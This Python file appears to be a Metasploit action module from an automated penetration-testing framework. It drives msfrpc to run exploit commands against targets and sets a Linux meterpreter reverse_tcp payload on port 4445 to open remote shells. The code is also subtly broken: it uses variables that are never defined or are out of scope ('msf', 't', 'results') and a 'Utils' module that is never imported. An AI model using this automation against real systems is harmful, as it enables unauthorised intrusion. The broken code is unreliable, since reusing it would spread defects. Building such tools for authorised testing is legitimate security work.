import time
from multiprocessing.pool import ThreadPool

from core.events import EventHandler
from core.keystore import KeyStore as kb
from core.packetcap import pktcap
from core.actionModule import actionModule
from core.mymsf import myMsf


class msfActionModule(actionModule):
    seentargets = dict()

    def __init__(self, config, display, lock):
        actionModule.__init__(self, config, display, lock)

        # connect to msfrpc
        msf = myMsf(host=self.config['msfhost'], port=int(self.config['msfport']), user=self.config['msfuser'],
        password=self.config['msfpass'])

    def go(self, vector):
        self.vector = vector
        self.display.verbose("-> Running : " + self.getTitle())
        self.display.debug("---> " + self.getDescription())

        if not msf.isAuthenticated():
            return
        ret = self.process()
        msf.cleanup()

        return ret

    def execMsf(self, target, cmds):

        myMsf.lock.acquire()                                                                                              
        self.display.verbose(self.shortName + " - Connecting to " + t)

        for line in cmds['config']:
            if line == "SLEEP":
                msf.sleep(int(self.config['msfexploitdelay']))
            else:
                msf.execute(line + "\n")

        if cmds['payload'] == "none":
            pass
        elif cmds['payload'] == "win":
            pass
        elif cmds['payload'] == "linux":
            msf.execute("set PAYLOAD linux/x86/meterpreter/reverse_tcp")
            msf.execute("set LPORT 4445")

        msf.execute("exploit -j\n")
        msf.sleep(int(self.config['msfexploitdelay']))

        outfile = self.config["proofsDir"] + self.shortName + "_" + t + "_" + Utils.getRandStr(10)

        result = msf.getResult()
        #while (re.search(".*execution completed.*", result) is None):
        #    result = result + msf.getResult()

        myMsf.lock.release()
        Utils.writeFile(result, outfile)

        return results, outfile
